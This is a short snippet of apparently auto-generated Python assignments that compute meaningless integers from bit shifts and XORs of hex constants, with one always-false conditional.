tmp_m778 = (0xda3b >> 3) ^ 0xb1
tmp_l518 = (59 > 5) if False else (59 == 5)
tmp_m257 = (0xf573 >> 4) ^ 0x1a
tmp_m631 = (0x5fb8 >> 4) ^ 0x30
tmp_m747 = (0xba4e >> 1) ^ 0xd9
tmp_m791 = (0x81dd >> 2) ^ 0xc8
tmp_m292 = (0xb4f8 >> 1) ^ 0x15
